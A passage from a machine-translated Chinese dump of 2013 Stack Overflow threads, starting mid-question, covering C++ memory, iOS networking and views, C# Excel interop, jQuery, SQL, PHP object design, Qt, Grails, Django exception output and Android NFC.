Memory dump: [pid = 17012 ] mapped: 51480K    writeable/private: 7456K    shared: 0K

3
3
3
size of vec 0
Memory dump: [pid = 17012 ] mapped: 51480K    writeable/private: 7456K    shared: 0K 
```

所以，基本上我删除了指针，不仅信息仍然存在，而且我可以在`clear()`.

我也尝试过删除 vec using`delete[]`但结果是一样的。

PS：我知道智能指针的存在，但我想知道为什么这段代码没有达到预期的效果。

PPS：我知道未定义的行为，忘记清除后的访问，我只想要一种有效的方法来立即释放内存，比如删除常规指针时。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:08:46.607

你有**未定义的行为**。这是由于您访问`std::vector`不存在的元素造成的。未定义的行为意味着任何事情都可能发生。甚至看起来应该被销毁的对象仍然存在。

C++ 标准没有说明操作系统应该如何管理内存的分配和释放。它只是给出了关于你的程序可以依赖什么的规则。没有理由说，分配给这三个`double`s 的内存实际上不能在您要求的时间稍晚一点后被操作系统回收。你不能再依赖它了。您唯一可以依靠的是您不应该在`std::vector`.

这正是标准将其指定为未定义行为的原因。它为操作系统或环境提供了执行其内存管理的余地，无论它选择如何，同时仍然为您的程序提供了可以依赖的规则来实现明确定义的行为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:14:02.373

删除从空闲存储区分配的内存不能保证将其返回给操作系统，或使其不可访问。通常，小分配由进程中的堆管理；它从系统中分配一个大块，并分配较小的块；删除的内存返回到该堆。这比每次分配都进入系统要有效得多。

这意味着删除的内存可能仍然可以访问，并且在重新使用之前，可能仍然包含删除时存在的任何数据。所以访问它会给出未定义的行为，而不是任何明确定义的错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:12:11.940

我认为问题在于您阅读矢量的方式：

```
for(int i =0; i < 3; i++) 
```

使用这一行，您正在阅读超出矢量末尾的内容。即使它的内容被删除，它也可能会在内存中保留一段时间。这意味着一旦它被删除，您就不能再确定这些位置中保存的内容是删除之前存储的内容，但它可以是您存储的内容。

这就像从 HD 中删除文件一样。在重写之前，这些位实际上是存在的，它们只是被设置为未使用。

# ios - 每小时轮询一次 TCP 服务器 ios

> ID：15899045
> 
> 赞同：3
> 
> 时间：2013-04-09T10:04:58.443
> 
> 标签：ios, xcode, tcp, background-process

在我当前的应用程序中，我需要每小时通过 TCP 连接轮询服务器。我知道最好的选择之一是从服务器端使用推送通知，但我不能这样做。所以目前我正在使用一个每 9 分钟触发一次的计时器，以保持应用程序在后台运行。这工作正常.. 在我打电话给服务器的投票时。

打开 Tcp 连接并生成轮询数据，但服务器没有响应。这是因为在后台应用程序无法运行需要几秒钟时间的代码块吗？任何帮助将不胜感激，我也会在下面发布一些代码，

```
if ([[UIDevice currentDevice] respondsToSelector:@selector(isMultitaskingSupported)]) 
{ 
    //Check if our iOS version supports multitasking I.E iOS 4

    if ([[UIDevice currentDevice] isMultitaskingSupported]) 
    { 
        //Check if device supports mulitasking
        UIApplication *application = [UIApplication sharedApplication];
        __block UIBackgroundTaskIdentifier background_task;
        background_task = [application beginBackgroundTaskWithExpirationHandler: ^ {

            UIStoryboard *mainStoryboard = [UIStoryboard storyboardWithName:@"MainStoryboard"
                                                         bundle: nil];
            ViewController *controller = (ViewController*)[mainStoryboard
                                               instantiateViewControllerWithIdentifier: @"viewController"];

            [controller sendPoll];
        });
    }
} 
```

然后编写输出数据的代码：

```
NSData *data = [[NSData alloc] initWithData:[string dataUsingEncoding:NSASCIIStringEncoding]];
[_cacheArray addObject:string];
[_outputStream write:[data bytes] maxLength:[data length]]; 
```

最后是streamDidReturn：

```
-(void)stream:(NSStream *)aStream handleEvent:(NSStreamEvent)eventCode
{
    NSLog(@"event number %i ", eventCode);
    switch (eventCode) 
    {
        case NSStreamEventOpenCompleted:
            NSLog(@"Stream opened");
                break;

        case NSStreamEventHasBytesAvailable:
               if (aStream == _inputStream) 
               {
                   uint8_t buffer[1024];
                   int len;

                   while ([_inputStream hasBytesAvailable]) 
                   {
                       len = [_inputStream read:buffer maxLength:sizeof(buffer)];
                       if (len > 0) 
                       {
                           NSString *output = [[NSString alloc] initWithBytes:buffer length:len encoding:NSASCIIStringEncoding];
                         if (nil != output) 
                             NSLog(@"server said: %@", output);
                       }
                   }
               }
               break;

         case NSStreamEventErrorOccurred:
             break;

         case NSStreamEventEndEncountered:
             break;

         case NSStreamEventHasSpaceAvailable:
             NSLog(@"space available");
             break;

         default:
             NSLog(@"Unknown event");
    }
} 
```

可用空间被调用，但离服务器没有更远的地方..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T00:00:01.010

我好像找到了答案！

通过改变我与服务器通信的功能，应用程序保持在活动状态足够长的时间来发送和接收投票。唯一的问题似乎是从 appDelegate 访问另一个 ViewController 并期望它像在前台状态一样运行。

感谢您重新编辑问题，坚决地清理了问题，非常感谢，

# c# - 替换或更新 Excel 文件中的条目

> ID：15899046
> 
> 赞同：0
> 
> 时间：2013-04-09T10:05:03.797
> 
> 标签：c#, asp.net, excel

我正在尝试在上传时清除 Excel (.xlsx) 文件中的一些数据（本例中为“电话号码”）。我有以下代码来打开文件：

```
protected void Button1_Click(object sender, EventArgs e)
{
    if (FileUpload1.HasFile)
        try
        {
            string filePath = ("confirm//") + FileUpload1.FileName;
            FileUpload1.SaveAs(Server.MapPath(filePath));

            Microsoft.Office.Interop.Excel.Application xl = 
                new Microsoft.Office.Interop.Excel.Application();

            Workbook wb = 
                xl.Application.Workbooks.Open(Server.MapPath(filePath));

            wb.Activate();
            string csvPath = (filePath.Replace(".xlsx", ".csv"));

            wb.SaveAs(Server.MapPath(csvPath), 
                Microsoft.Office.Interop.Excel.XlFileFormat.xlCSV);

            wb.Close();             

            // call method to parse csv
            ReadRec(csvPath);
        }
        catch (Exception ex)
        {//}
    else
    {//}
} 
```

然后像这样在数字的开头添加一个零（如果还没有的话）：

```
private void ReadRec(string csvName)
{
    StreamReader Sr = new StreamReader(Server.MapPath(csvName));
    string s;

    while (!Sr.EndOfStream)
    {
        s = Sr.ReadLine();

        string company = s.Split(',')[0];
        string phone = s.Split(',')[1];
        string NAME = s.Split(',')[2];

        if (!phone.StartsWith("0"))
        {
            phone = "0" + phone;
        }
    }
    Sr.Close();
} 
```

这似乎运作良好，但我无法弄清楚如何将更新的数字重新插入电子表格（或使用更新的数据创建一个新的 Excel 文件）。

谁能给我一些指示？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T15:38:09.687

好的，最后拼凑出一个可行的解决方案（对于我目前的目的来说已经足够了），但远非理想：

```
protected void Button1_Click(object sender, EventArgs e)
{       
    if (FileUpload1.HasFile)
        try
        {
            var excelApp = new Application();
            excelApp.Workbooks.Open("C:\\myFile.xls", Type.Missing, Type.Missing,
                                                   Type.Missing, Type.Missing,
                                                   Type.Missing, Type.Missing,
                                                   Type.Missing, Type.Missing,
                                                   Type.Missing, Type.Missing,
                                                   Type.Missing, Type.Missing,
                                                   Type.Missing, Type.Missing);
            var ws = excelApp.Worksheets;
            var worksheet = (Worksheet)ws.get_Item("Sheet1");
            Range range = worksheet.UsedRange;
            object[,] values = (object[,])range.Value2;

            for (int row = 1; row <= values.GetUpperBound(0); row++)
            {
                string phone = Convert.ToString(values[row, 2]);
                if (!phone.StartsWith("0"))
                {
                    phone = "0" + phone;
                }
                range.Cells.set_Item(row, 2, phone);
            }
            excelApp.Save("C:\\Leads.xls");
            excelApp.Quit();
       }
        catch (Exception ex)
        {//}
    else
    {//}
} 
```

-编辑-为了使它工作，我必须`.xlsx`在 Excel 中打开文件并将其另存为`.xls`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T12:48:15.633

我并没有真正使用[c#](/questions/tagged/c%23 "显示标记为“c#”的问题")或[asp.net](/questions/tagged/asp.net "显示标记为“asp.net”的问题")，所以这（可能）不会是工作代码。

C# 中的互操作*应该*非常简单，文档通常包含特定于 C# 的示例，因此如果失败，请查看 MSDN。

```
protected void Button1_Click(object sender, EventArgs e)
{
    if (FileUpload1.HasFile)
        try
        {
            string filePath = ("confirm//") + FileUpload1.FileName;
            FileUpload1.SaveAs(Server.MapPath(filePath));

            Microsoft.Office.Interop.Excel.Application xl = 
                new Microsoft.Office.Interop.Excel.Application();

            Workbook wb = 
                xl.Application.Workbooks.Open(Server.MapPath(filePath));

            wb.Activate();

            Worksheet ws = wb.Worksheets(1); // use the first sheet 1-based index i think

            for (long row = 2; i <= ws.UsedRange.Rows.Count; i++) {
                // assume row 1 is a title so start at row 2
                // ws.Cells(row, 1) // company
                // ws.Cells(row, 2) // phone
                // ws.Cells(row, 3) // name
                if (!ws.Cells(row,2).Value2.StartsWith("0") {
                    ws.Cells(row,2).Value2 = "0" + ws.Cells(row,2).Value2
                }
            }

            //string csvPath = (filePath.Replace(".xlsx", ".csv"));

            //wb.SaveAs(Server.MapPath(csvPath), 
            //    Microsoft.Office.Interop.Excel.XlFileFormat.xlCSV);
            wb.Save(); // as were directly modifying the file, no need to save elsewhere

            wb.Close();             

            // call method to parse csv
            //ReadRec(csvPath);
        }
        catch (Exception ex)
        {//}
    else
    {//}
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-22T06:03:40.970

我已使用此代码更新 EXCEL 表中的数据

```
 try
        {
            cmd.CommandText = "UPDATE [Sheet1$] SET ID=@value,Name=@value2,Age=@value3 where ID=@value4";
            cn.Open();
            cmd.Parameters.AddWithValue("@value1", txtid.Text);
            cmd.Parameters.AddWithValue("@value2", txtname.Text);
            cmd.Parameters.AddWithValue("@value3", txtage.Text);
            cmd.Parameters.AddWithValue("@value4", txtupdate.Text);
            cmd.ExecuteNonQuery();
            MessageBox.Show("Record Updated Successfully");
            cn.Close();
        }
        catch (Exception e3)
        {
            MessageBox.Show("Error" + e3);
        } 
```

# javascript - 如何使用 popcorn.js 暂停和播放视频

> ID：15899053
> 
> 赞同：2
> 
> 时间：2013-04-09T10:05:16.990
> 
> 标签：javascript, video, html5-video, dom-events, popcornjs

我正在尝试设置一个视频页面，视频在 5 秒后自动停止播放，但我不知道如何使用 popcorn.js 来做到这一点。

另外，我需要设置一个按钮来在用户点击时重播视频。我有按钮，但我不知道如何创建一个事件来让视频再次播放。

如果有人知道如何做到这一点，我会非常高兴，因为我是电影制作人而不是程序员，而且我迷失了 Javascript。

我愿意回报这个人情。如果您需要有关视频编辑或制作或动画的任何内容，请随时与我联系。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T13:16:01.793

您可以通过利用`timeupdate`视频元素的事件来做到这一点。假设页面上的视频元素名为`video`，代码如下所示：

```
document.getElementById('video').timeupdate = function () {
    var video = document.getElementById('video');
    if (video.currentTime == 5) {
        video.pause();
    }
}; 
```

然后使用按钮，您可以附加到`onclick`事件并播放视频：

```
document.getElementById('playButton').onclick = function () {
    var video = document.getElementById('video');
    video.play();
} 
```

# sql - CTE 循环中的循环

> ID：15899054
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:05:18.257
> 
> 标签：sql, sql-server, loops, common-table-expression

情况：我有2张桌子。一个有 2 个字段 StartDate 和 EndDate。一张表，其中只有一个字段日期。因此，当您在开始日期和结束日期之间有 3 天时。他必须在新表中插入 3 行。

我有下一个代码，它在表可用性中插入了完美的行。

```
with View_Solidnet_Training as
(
select  cast('2013-04-09' as datetime) DateValue
union all
select DateValue + 1
from View_Solidnet_Training
where DateValue + 1 <= cast('2013-04-11' as datetime)
)
insert into OBJ_Availability  
select 34, DateValue, 'AM', 2, 'Test' from View_Solidnet_Training; 
```

但是现在，在他在新表中插入行之后，他停止了。但是在循环之后，他必须在视图中的下一行的新值中再次更改 Start 和 EndDate：View_Solidnet_Training。

那么是否有可能的解决方案，或者我应该创建一个新循环来检查视图的 ID 是否不为零？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:58:28.403

据我了解您的问题，我认为您应该从将日期放入列表开始，然后再插入。

样本：

```
create table Dates
(
startdate datetime,
endDate datetime
)

insert dates
SELECT '2013-04-06','2013-04-08'

SELECT * from Dates

Declare @date int
Declare  @tbl table 
(
date_ datetime
)

SELECT @date = datediff(day,startDate-1,EndDate) from Dates
SELECT @date

while(@date != 0 )
Begin 

insert into @tbl
SELECT dateadd(day,@date,StartDate-1) from dates

set @date = @date -1

END

/*
--TO-DO
--Update StartDate and EndDate values in table Dates
-- insert YourTable 
-- select date_ from @tbl
*/
SELECT * from @tbl
order by date_ 
```

# jquery - jquery select2和ajax

> ID：15899055
> 
> 赞同：0
> 
> 时间：2013-04-09T10:05:22.273
> 
> 标签：jquery, ajax

我试过了`jQuery` `select2`

```
http://ivaynberg.github.io/select2/ 
```

它正在按预期工作。

但是，我的选择有 700 多个选项，我不想在用户希望使用选择框之前加载它们。

所以，我试图仅在用户单击按钮时显示选择框。

```
<html> 
    <head>
        <title>jQuery Load of Script</title>
    </head>
<body>
    <div id="showselect">
        <button onclick="showselect()">select category</button>
    </div>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>

    <script>
        function showselect() { 
            document.getElementById('showselect').innerHTML='loading...';
            $('#showselect').load('select1.htm');
            $.getScript("select2.js");
            $(".chzn").select2({width:230});
        }
    </script>
</body>
</html> 
```

`select1.htm`包含 css 样式以及选择表单 html 代码：

```
http://likeforums.com/select1.htm 
```

`select2.js`取自 select2 脚本，它在这里：

```
http://likeforums.com/select2.js 
```

结果在这里：

```
http://likeforums.com/test-select3.htm 
```

单击按钮时，它只显示选择框并且`select2`不起作用。

请帮忙。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:18:23.723

无需加载它隐藏它`document.ready`并显示它`button` `click`

```
$(document).ready(function(){   
    $("#listid").hide();
    $("#buttonid").click(function(){    
        $("#listid").show();
    });
}); 
```

之后编写 jquery 以在选择列表中显示数据，您需要在单击事件中编写 jquery for list

```
$("#listid").click(function(){
    //Write code to bind the data 
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:24:56.393

这里有个建议，`select2()`脚本成功加载执行后调用。所以放

```
$(".chzn").select2({width:230}); 
```

在`getScript()`函数的回调中：

```
function showselect() { 
    document.getElementById('showselect').innerHTML='loading...';
    $('#showselect').load('select1.htm');
    $.getScript("select2.js",function() {
       $(".chzn").select2({width:230});
   });
} 
```

这是文档[getScript()](http://api.jquery.com/jQuery.getScript/)。

享受...

# iphone - ViewDidLoad 方法调用行为

> ID：15899062
> 
> 赞同：1
> 
> 时间：2013-04-09T10:05:40.213
> 
> 标签：iphone, ios, nsthread, performselector

在我的`viewDidLoad`中，我调用了一个函数：

```
[common startActivityIndicatorOnView:self.view]; 
```

此方法添加一个带有 Activity 指示器的视图，位于`self.view`. 我当前的视图被推送到导航堆栈上。这是该方法返回后视图的外观（活动指示器视图不在中心）： ![在此处输入图像描述](https://i.stack.imgur.com/zl9F2.png)

但是，如果我这样调用相同的方法：

```
[common performSelectorOnMainThread:@selector(startActivityIndicatorOnView:) withObject:self.view waitUntilDone:NO]; 
```

该视图如下图所示（活动指示器视图位于中心）：

![在此处输入图像描述](https://i.stack.imgur.com/ICLWc.png)

我不明白，如果调用行是用`viewDidLoad`. 如果有人可以帮助我得到这个，在此先感谢。

仅供参考，该方法如下所示：

```
-(void) startActivityIndicatorOnView:(UIView *)view {
    if ([NSRunLoop currentRunLoop] != [NSRunLoop mainRunLoop]) {
        [self performSelectorOnMainThread:@selector(startActivityIndicatorOnView:) withObject:view waitUntilDone:NO];
        return;
    }
    view.userInteractionEnabled = NO;
    activityBgView = [[UIView alloc] initWithFrame:CGRectMake((view.frame.size.width/2) - 50, (view.frame.size.width/2) - 50, 100, 100)];
    activityBgView.center = view.center;
    activityBgView.backgroundColor = [UIColor grayColor];
    activityBgView.alpha = 0.8;
    spinner = [[UIActivityIndicatorView alloc] initWithFrame:CGRectMake((activityBgView.frame.size.width/2)-10, (activityBgView.frame.size.width/2)-10, 20, 20)];
    spinner.activityIndicatorViewStyle = UIActivityIndicatorViewStyleWhiteLarge;
    spinner.center = view.center;

    [view addSubview:activityBgView];
    [view addSubview:spinner];
    [spinner startAnimating];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:23:13.247

ViewDidLoad 在您加载 viewControllers（通过 nib/xib 或在 loadView 方法中以编程方式创建）时被调用，这意味着 xcode 创建所有视图并实例化和分配 xib 中的所有对象...

但是，您的 viewController 视图（和子视图）仍未添加到任何视图中......

```
yourViewController.view.superView = nil; 
```

所以，它的视图有你在 xib 中设置的框架，但是如果你告诉它在它的超级视图内调整大小，当你添加它时（例如使用 push 或 addsubview），它的框架会改变，但你的微调器不会改变它的位置。

调用 performSelectorOnMainThread 只会在稍后调用您的方法，当您当前的线程前进并且可能已经推送了您的 viewController.view 时，因此，在执行时，您的 ViewController.view.superView 存在，因此 view.frame 已经更改。

尝试将您的呼叫转移到

```
[common startActivityIndicatorOnView:self.view]; 
```

在 viewWillAppear 方法中：此时 yourViewController.view 应该已经调整大小以适合其 superView

**编辑：**

@帕维尔问题：

> 什么时候之后 yourViewController.view.superView 将不为零？

平庸：当您将其视图添加到视图时。也就是说，首先分配并初始化它（使用 nib 或通过代码初始化）

就像是：

```
yourViewControllerInstance = [[YourViewController alloc]initWithNibName:@"yourViewControllerNib" bundle:nil]; 
```

此时`viewDidLoad`调用您类中的方法（但 yourViewController.view.superview 0 nil）

稍后，您通常会使用新的 viewController，因此您将其“推入”navigationController 的堆栈中，或者您只需将其视图添加到当前的 viewController.view... 类似于：

```
[currentViewController.view addSubview:yourViewController.view]; 
```

在这行之后，你可以想象，yourViewController.view.superView = currentViewController.view，并且`viewWillAppear`调用了yourViewController的方法，所以你可以在里面使用superView。

请注意，此时您的 viewController.view 在屏幕上仍然不可见，因此您可以在此处调整大小、移动或添加视图，而用户不会看到任何更改。

在此之后，yourViewController 将显示，最后，`viewDidAppear`调用 yourViewController 的方法（对于任何其他代码，以防万一）

# asp.net-mvc-4 - 使用资源文件处理转换错误

> ID：15899064
> 
> 赞同：1
> 
> 时间：2013-04-09T10:05:43.373
> 
> 标签：asp.net-mvc-4, data-annotations, custom-attributes

我已经国际化了我的 MvC4 应用程序。模型内部只有一个属性

```
public float Fuels{ get; set; } 
```

当我在与该属性对应的文本框中键入字符串值时，出现验证错误`'The value 'ff' is not valid for Fuels.'`。但我想使用资源文件处理它。如果我选​​择了阿拉伯语，那么验证错误应该以阿拉伯语出现。我使用以下代码收到所需的消息

```
[Required(ErrorMessageResourceType = typeof(@Application.Resources.Admin.Country),
            ErrorMessageResourceName = "FuelReq")] 
```

我尝试了以下方法：-

```
public class FLoatAttribute : DataTypeAttribute
    {
        private const string defaultErrorMessage = "{0}  is required.";
        public FLoatAttribute()
            : base(defaultErrorMessage)
        {
        }
        public override string FormatErrorMessage(string name)
        {
            return string.Format(ErrorMessageString, name);
        }

        public override bool IsValid(object value)
        {
            float objFloat;
            return float.TryParse(Convert.ToString(value), out objFloat);
        }
    } 
```

并尝试在模型中使用正则表达式。但它没有用。请帮助我。

# svn - 在 Aptana 的“App Explorer”中显示项目文件夹以 SVN 更新或提交我的项目

> ID：15899067
> 
> 赞同：1
> 
> 时间：2013-04-09T10:05:56.193
> 
> 标签：svn, aptana

Aptana 的 App Explorer 显示项目中的所有文件。但对我来说，要 SVN 更新或提交我的整个项目，我需要能够右键单击项目文件夹，而不仅仅是子文件夹。但项目文件夹未显示在 App Explorer 中。

我现在要做的是切换到项目资源管理器并右键单击那里的项目文件夹，但在 App Explorer 中执行此操作会容易得多。有谁知道如何在 App Explorer 中显示项目文件夹或在 App Explorer 中更新或提交我的整个项目的不同方式？

# jquery - jQuery ui 自动完成：不注册 IME 事件？

> ID：15899069
> 
> 赞同：1
> 
> 时间：2013-04-09T10:06:05.073
> 
> 标签：jquery, jquery-ui, autocomplete, ime

我正在尝试让[自动完成功能](http://jqueryui.com/autocomplete/#remote)与英文字母和希伯来字母（utf-8）一起使用。

**当我输入英语时，小部件本身可以正常工作**，自动完成会弹出结果。但是，要编写希伯来语，我使用虚拟[谷歌键盘](https://developers.google.com/virtual-keyboard/v1/getting_started#hiworld)输入法。当我实际使用虚拟键盘键入时，**什么也没有弹出**。但是，当我按向左或向右**箭头键**时，会弹出带有希伯来语单词的自动完成功能。

有没有办法解决这个问题？以便 IME（谷歌键盘）按键被注册，就好像我正在使用我的键盘进行 jQuery 自动完成一样？

如果需要，这是我在 html 中的脚本（用于虚拟键盘）：

```
<script type="text/javascript">
google.load("elements", "1", {packages: "keyboard"});

var kbd;

function onLoad() {
  kbd = new google.elements.keyboard.Keyboard(
      [google.elements.keyboard.LayoutCode.HEBREW],
      ['project']); // 'project' is the input box
}

// If the keyboard is visible, hide it.
// If the keyboard is invisible, show it.
function toggleVisible() {
  var button = document.getElementById('btVisible');
  if (kbd.isVisible()) {
    kbd.setVisible(false);
    document.getElementById('btVisible').value = 'Show';
  } else {
    kbd.setVisible(true);
    document.getElementById('btVisible').value = 'Hide';
  }
}

google.setOnLoadCallback(onLoad);
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-13T05:34:40.627

（我知道我在回答一个旧帖子。）

我对希伯来语一无所知，但我遇到了 jQuery UI 自动完成和日语 IME 的问题。也许下面的票可能会有所帮助？ [http://bugs.jqueryui.com/ticket/5933](http://bugs.jqueryui.com/ticket/5933)

这是我解决此问题的方法： [https ://gist.github.com/k4200/1192189](https://gist.github.com/k4200/1192189)

高温高压

# php - 如何为两个不同实体拥有的对象建模？

> ID：15899071
> 
> 赞同：0
> 
> 时间：2013-04-09T10:06:07.807
> 
> 标签：php, oop, architecture, software-design

假设如果两个家庭 Smiths 和 Johns 有两个相同品牌和制造的割草机，我如何在编程中为这种场景建模？

我的意思是，由于两个草坪搬运工都有单独的序列号，我可以将它们映射到两个不同的对象，这与现实世界的情况是封闭的。

或者我应该只创建一个对象并在与现实世界场景完全不同的两个家庭之间共享它。

哪个是可以减少未来问题并提供可行性的最佳实践？

提前致谢....

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:17:46.180

您应该将割草机作为单独的对象，而家庭对象应该拥有割草机。这是“具有”关系，您可以使用组合。因此，家庭对象可以拥有属性草坪移动器，他们的草坪移动器将被存储在其中。您可以通过这样的家庭对象访问家庭草坪搬运工：

```
$family = new Family();
$family->lawnMover->start(); 
```

家庭不应该扩展割草机，因为那是“是”的关系，割草机不是家庭！它属于家庭，因此家庭“拥有”割草机。

我认为您应该始终使用真实世界的示例。阅读：[领域驱动设计](http://en.wikipedia.org/wiki/Domain-driven_design)

简而言之，DDD 是当您尝试使用 OOP 模拟现实世界时。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:21:46.130

这是非常基本的，根据不同的程序员可能不是完美的例子，但这里有；

```
class Family {
    public $name;
    public $inventory = array();

    public function __construct($name = '') {
        $this->name = $name;
    }

    public function add_inventory_item($object) {
        if (is_object($object)) {
            $this->inventory[] = $object;

            return TRUE;
        }
        else {
            return FALSE;
        }
    }
}

class Machine {
    public $name;
    public $manufacturer;
    public $serial_number;

    public function __construct($name = '', $manufacturer = '', $serial_number = '') {
        $this->name = $name;
        $this->manufacturer = $manufacturer;
        $this->serial_number = $serial_number;
    }
}

$fam_smiths = new Family('Smiths');
$fam_johns = new Family('Johns');

$lawnmower_a = new Machine('Lawnmower A', 'Some company A', '1234');
$lawnmower_b = new Machine('Lawnmower B', 'Some company B', '5678');

if ($fam_smiths->add_inventory_item($lawnmower_a)) {
    echo 'Lawnmower A added to family Smiths\' their inventory.<br /><br />';
}
else {
    echo 'Lawnmower A doesn\t have the correct strucure.<br /><br />';
}

if ($fam_johns->add_inventory_item($lawnmower_b)) {
    echo 'Lawnmower B added to family Johns\' their inventory.<br /><br />';
}
else {
    echo 'Lawnmower B doesn\t have the correct strucure.<br /><br />';
}

echo '<pre>';
print_r($fam_smiths);
print_r($fam_johns);
echo '</pre>'; 
```

**输出**

```
Lawnmower A added to family Smiths' their inventory.

Lawnmower B added to family Johns' their inventory.

Family Object
(
    [name] => Smiths
    [inventory] => Array
        (
            [0] => Machine Object
                (
                    [name] => Lawnmower A
                    [manufacturer] => Some company A
                    [serial_number] => 1234
                )

        )

)
Family Object
(
    [name] => Johns
    [inventory] => Array
        (
            [0] => Machine Object
                (
                    [name] => Lawnmower B
                    [manufacturer] => Some company B
                    [serial_number] => 5678
                )

        )

) 
```

您还可以创建一个超类构造，其中割草机也是一个类，继承机器的所有基础知识。

# windows - Qt Creator “程序意外完成。”

> ID：15899072
> 
> 赞同：3
> 
> 时间：2013-04-09T10:06:07.777
> 
> 标签：windows, qt, project, qt-creator

昨天我安装了 Qt Creator 和 Qt Library 5.0.1。当我创建一个新项目并想看看它的外观时，我构建并运行了该程序，但出现以下错误：

```
Starting C:\Users\Khaled\workspace_qt\Test-build-Desktop_Qt_5_0_1_MinGW_32bit-Debug\debug\Test.exe...
The program has unexpectedly finished.
C:\Users\Khaled\workspace_qt\Test-build-Desktop_Qt_5_0_1_MinGW_32bit-Debug\debug\Test.exe exited with code -1073741511 
```

当我尝试从示例部分构建和运行地址簿应用程序时，我遇到了同样的错误。

我在这里寻找其他问题，我读到一个说检查`g++`版本并从设置部分更改工具链的`Build & Run`问题，但没有说工具链。我还阅读了一篇文章，它说尝试在调试和发布模式之间进行转换，但两者都不起作用。我也刚刚阅读了一篇关于使用事件查看器查看缺少的 dll 的帖子，但我找不到任何东西。

为什么我会收到此错误消息，我该如何解决？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-13T18:12:54.453

如果您通过单击它或使用 cmd（基本上不是通过 Qt）来运行您的应用程序，您将收到一个 Windows 系统错误通知您该问题。如果您缺少 DLL（您似乎是），您将被告知哪些是，尽管它一次只会告诉您一个。

# grails - CreateCriteria grails

> ID：15899073
> 
> 赞同：0
> 
> 时间：2013-04-09T10:06:13.123
> 
> 标签：grails

我正在尝试在 grails 中使用创建标准方法，但我返回一个空列表，我不知道为什么。我的代码如下

```
 def results = PostOrder.createCriteria().list() {
        posts{
            author{
                eq('username', lookupPerson().username)
            }
        }
        picture{
            user{
                eq('username', lookupPerson().username)
            }
        }
    } 
```

PostOrder 域如下：

```
class PostOrder {

    String pOrder
    Date dateCreated
    Picture picture
    Post posts
    Video video
    Boolean favorite = false

    static hasMany = [children : Child]

    static constraints = {
        picture nullable: true
        posts nullable: true
        video nullable:  true
    }
} 
```

帖子如下：

```
 class Post {

    String message
    User author
    Date dateCreated
    Child child
    boolean postedToAll
    String tag

static hasMany = [tags:Tag]

    static constraints = {
        child nullable: true
        tags nullable: true
        tag nullable: true
     }
} 
```

最后图片如下：

```
 class Picture {

    String orgName
    String urlOrg
    String urlWeb
    String urlThumb
    Date   dateCreated
    String caption
    Child child
    User user
    Album contained
    String tag
    boolean postedToAll

    static hasMany = [tags:Tag]

    static constraints = {
        orgName blank: false
        caption maxSize: 500
        tags nullable:  true
        caption nullable: true
        tag nullable: true
        child nullable:  true
    }
} 
```

对我来说，这会很好用，任何人都可以看到为什么不可以吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-08-01T18:27:32.520

也许您应该像这样添加一个逻辑块（和/或）：

```
def results = PostOrder.createCriteria().list() {
    or {
        posts{
            author{
                eq('username', lookupPerson().username)
            }
        }
        picture{
            user{
                eq('username', lookupPerson().username)
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-12T06:15:11.693

图片和帖子中的用户名是否相同？？？如果不是，则必须用 and or{} 将它们括起来，因为默认情况下它使用 and 逻辑

# python - 禁用 Django 异常格式

> ID：15899074
> 
> 赞同：1
> 
> 时间：2013-04-09T10:06:14.060
> 
> 标签：python, django, exception

我正在从另一个应用程序中调用 Django。

调试时，如果发生 Django 异常，则会提取 (html) 响应正文，然后将其包装在调用应用程序中生成的异常中。

这使得确定问题所在非常痛苦，因为我需要遍历 CSS、Html、Js 等。

有什么方法可以让 Django 仅将异常消息和堆栈跟踪作为纯文本输出？

![在此处输入图像描述](https://i.stack.imgur.com/Cvzf9.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:05:37.310

您可以编写自己的异常处理中间件类。请参阅[`process_exception`中间件方法](https://docs.djangoproject.com/en/1.5/topics/http/middleware/#process-exception)的文档：

> `process_exception(self, request, exception)`
> 
> `request`是一个`HttpRequest`对象。`exception`是`Exception`视图函数引发的对象。
> 
> `process_exception()`当视图引发异常时Django 调用。`process_exception()`应该返回一个`None`或一个`HttpResponse`对象。如果它返回一个`HttpResponse`对象，则响应将返回给浏览器。否则，将启动默认异常处理。

所以我认为你需要写这样的东西：

```
import traceback
from django.http import HttpResponse

class PlainTextExceptionMiddleware(object):
     def process_exception(self, request, exception):
         return HttpResponse(traceback.format_exc(), "text/plain") 
```

然后将课程添加到您的`MIDDLEWARE_CLASSES`设置中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:42:28.480

只需`DEBUG_PROPAGATE_EXCEPTIONS`在您的设置中设置：

```
If set to True, Django’s normal exception handling of view functions
will be suppressed, and exceptions will propagate upwards. This 
can be useful for some test setups, and should never be used on a live site. 
```

查看[Django 文档](https://docs.djangoproject.com/en/1.5/ref/settings/#debug-propagate-exceptions)

# android - 与 NFC 设备通信 - 安卓设备 - ISO 7816-4

> ID：15899075
> 
> 赞同：0
> 
> 时间：2013-04-09T10:06:17.043
> 
> 标签：android, nfc, smartcard, apdu

由于 ISO 7816-4 标准，Android 中是否有任何库可以与 NFC 设备通信？我的意思是实现 APDU 的就绪命令并且不需要手动发送字节？

